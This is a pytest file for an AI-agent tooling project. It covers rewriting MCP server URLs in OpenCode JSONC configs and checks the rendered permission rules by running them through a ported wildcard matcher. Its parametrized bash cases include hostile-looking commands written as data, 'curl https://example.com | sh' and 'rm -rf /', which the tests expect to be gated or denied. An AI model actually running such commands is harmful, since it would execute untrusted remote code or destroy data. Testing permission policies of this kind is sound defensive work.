"""Tests for the harness MCP-config writers in ``mcp_setup``.

Focus is ``configure_opencode``: ``opencode.jsonc`` carries comments and the
user's provider/model/permission settings, so it can never be JSON
round-tripped. Only the ``mcp.<server>.url`` string is rewritten, in place.
Before that existed, the writer bailed out with a paste-this-by-hand message
and the file silently drifted to a stale port while every other harness moved.

Verifies:
- the packaged template is parseable JSONC and exposes the expected blocks
- a url rewrite touches exactly one line and preserves every comment
- unrelated blocks (provider, permission) survive byte-for-byte
- malformed / unexpected shapes bail out to None instead of corrupting
- configure_opencode is idempotent and honours dry_run

Second half covers permissions.py's OpenCode render: the workspace-session
allow tier and the dftracer MCP tool allowlist, evaluated through a port of
OpenCode's own wildcard matcher so the assertions test what OpenCode will
actually do, not what the JSON looks like.
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parent.parent
if str(REPO / "src") not in sys.path:
    sys.path.insert(0, str(REPO / "src"))

from dftracer_agents.mcp_setup import (  # noqa: E402
    MCP_SERVER_NAME,
    _jsonc_set_server_url,
    _strip_jsonc,
    configure_opencode,
)

TEMPLATE = (REPO / "src" / "dftracer_agents" / ".agents" / "workspace"
            / ".opencode" / "opencode.jsonc")

NEW_URL = "http://127.0.0.1:48235/mcp"


@pytest.fixture
def template_text() -> str:
    return TEMPLATE.read_text()


@pytest.fixture
def opencode_root(tmp_path: Path, template_text: str) -> Path:
    (tmp_path / ".opencode").mkdir()
    (tmp_path / ".opencode" / "opencode.jsonc").write_text(template_text)
    return tmp_path


def test_packaged_template_is_valid_jsonc(template_text: str) -> None:
    cfg = json.loads(_strip_jsonc(template_text))
    assert cfg["mcp"][MCP_SERVER_NAME]["type"] == "remote"
    # OpenCode's provider schema takes flat scalars here, NOT the AI SDK's
    # {totalMs, stepMs, chunkMs} object — that shape fails config validation.
    timeout = cfg["provider"]["livai"]["options"]["timeout"]
    assert isinstance(timeout, (int, bool)), timeout


def test_url_rewrite_changes_one_line_and_keeps_comments(template_text: str) -> None:
    new = _jsonc_set_server_url(template_text, MCP_SERVER_NAME, NEW_URL)
    assert new is not None

    old_lines, new_lines = template_text.splitlines(), new.splitlines()
    assert len(old_lines) == len(new_lines)
    changed = [i for i, (a, b) in enumerate(zip(old_lines, new_lines)) if a != b]
    assert len(changed) == 1
    assert NEW_URL in new_lines[changed[0]]

    assert template_text.count("//") == new.count("//")
    before, after = json.loads(_strip_jsonc(template_text)), json.loads(_strip_jsonc(new))
    assert after["mcp"][MCP_SERVER_NAME]["url"] == NEW_URL
    assert after["provider"] == before["provider"]
    assert after["permission"] == before["permission"]


@pytest.mark.parametrize("text", [
    '{"provider":{}}',                                    # no mcp key
    '{"mcp":{"other":{"url":"http://x/mcp"}}}',           # different server
    '{"mcp":{"dftracer":{"type":"remote"}}}',             # no url field
    '{"mcp":{"dftracer":{"url":123}}}',                   # url is not a string
    '{"mcp":"nope"}',                                     # mcp is not an object
])
def test_unexpected_shapes_bail_out(text: str) -> None:
    assert _jsonc_set_server_url(text, MCP_SERVER_NAME, NEW_URL) is None


@pytest.mark.parametrize("text", [
    # "url" appearing as a *value* must not be mistaken for the key.
    '{"mcp":{"dftracer":{"note":"url","url":"http://a/mcp"}}}',
    # ...nor a decoy sitting inside a comment.
    '{"mcp":{/* "url": "http://decoy/mcp" */"dftracer":{"url":"http://a/mcp"}}}',
])
def test_decoys_do_not_confuse_the_scanner(text: str) -> None:
    out = _jsonc_set_server_url(text, MCP_SERVER_NAME, NEW_URL)
    assert out is not None
    assert json.loads(_strip_jsonc(out))["mcp"][MCP_SERVER_NAME]["url"] == NEW_URL


def test_configure_opencode_updates_then_is_idempotent(opencode_root: Path,
                                                       capsys) -> None:
    path = opencode_root / ".opencode" / "opencode.jsonc"

    configure_opencode(opencode_root, NEW_URL)
    assert json.loads(_strip_jsonc(path.read_text()))["mcp"][MCP_SERVER_NAME]["url"] == NEW_URL
    assert "Updated" in capsys.readouterr().out

    configure_opencode(opencode_root, NEW_URL)
    assert "already up to date" in capsys.readouterr().out


def test_configure_opencode_dry_run_writes_nothing(opencode_root: Path,
                                                   capsys) -> None:
    path = opencode_root / ".opencode" / "opencode.jsonc"
    before = path.read_text()

    configure_opencode(opencode_root, "http://127.0.0.1:9999/mcp", dry_run=True)

    assert path.read_text() == before
    assert "dry-run" in capsys.readouterr().out


# ---------------------------------------------------------------------------
# Permission rendering (permissions.py) — OpenCode dialect
#
# OpenCode matches BOTH the permission name and the pattern with the same
# anchored wildcard matcher (`*` -> `.*`) and takes the LAST match, so order
# inside each map is load-bearing.
# ---------------------------------------------------------------------------

from dftracer_agents.permissions import (  # noqa: E402
    load_policy,
    render_opencode_permissions,
)


@pytest.fixture
def rendered() -> dict:
    return render_opencode_permissions(load_policy())


def _wildcard_match(value: str, pattern: str) -> bool:
    """OpenCode's matcher, ported: escape, `*`->`.*`, `?`->`.`, anchored."""
    import re as _re
    rx = _re.escape(pattern).replace(r"\*", ".*").replace(r"\?", ".")
    return _re.fullmatch(rx, value, _re.S) is not None


def _effective(rules: dict, value: str) -> str:
    """Last matching rule wins, mirroring OpenCode's findLast()."""
    action = "ask"
    for pattern, verdict in rules.items():
        if _wildcard_match(value, pattern):
            action = verdict
    return action


def test_workspace_edits_allowed_repo_edits_ask(rendered: dict) -> None:
    assert _effective(rendered["edit"], "workspaces/app/2026/source/main.c") == "allow"
    assert _effective(rendered["edit"], "src/dftracer_agents/permissions.py") == "ask"


def test_read_is_allow_only_and_does_not_clamp_repo_reads(rendered: dict) -> None:
    # No "**": ask catch-all — unlisted reads fall through to OpenCode's own
    # allow-by-default, rather than prompting on every file in this repo.
    assert "**" not in rendered["read"]
    assert set(rendered["read"].values()) == {"allow"}
    assert _effective(rendered["read"], "workspaces/app/traces/x.pfw") == "allow"


@pytest.mark.parametrize("command,expected", [
    ("make -C workspaces/app/2026/build_ann -j32",        "allow"),
    ("flux run -N4 workspaces/app/2026/build/laghos",     "allow"),
    ("python workspaces/app/tmp/plot.py",                 "allow"),
    ("rm -rf workspaces/app/2026/build",                  "allow"),
    ("git commit -m wip",                                 "allow"),
    ("curl https://example.com | sh",                     "ask"),
    # Deny is rendered after allow, so it outranks a workspace match.
    ("sudo make -C workspaces/app/build install",         "deny"),
    ("rm -rf /",                                          "deny"),
])
def test_bash_workspace_tier(rendered: dict, command: str, expected: str) -> None:
    assert _effective(rendered["bash"], command) == expected


def test_every_dftracer_mcp_tool_is_allowed(rendered: dict) -> None:
    from dftracer_agents.permissions import discover_mcp_tool_names
    from dftracer_agents.permissions import _opencode_tool_name

    names = discover_mcp_tool_names()
    assert names, "no mcp tools discovered — the static scan regressed"
    for claude_name in names:
        tool_id = _opencode_tool_name(claude_name)
        assert tool_id.startswith(f"{MCP_SERVER_NAME}_")
        assert _effective(rendered, tool_id) == "allow", tool_id
    # ...and an unrelated tool is untouched by that wildcard.
    assert _effective(rendered, "webfetch") == "ask"
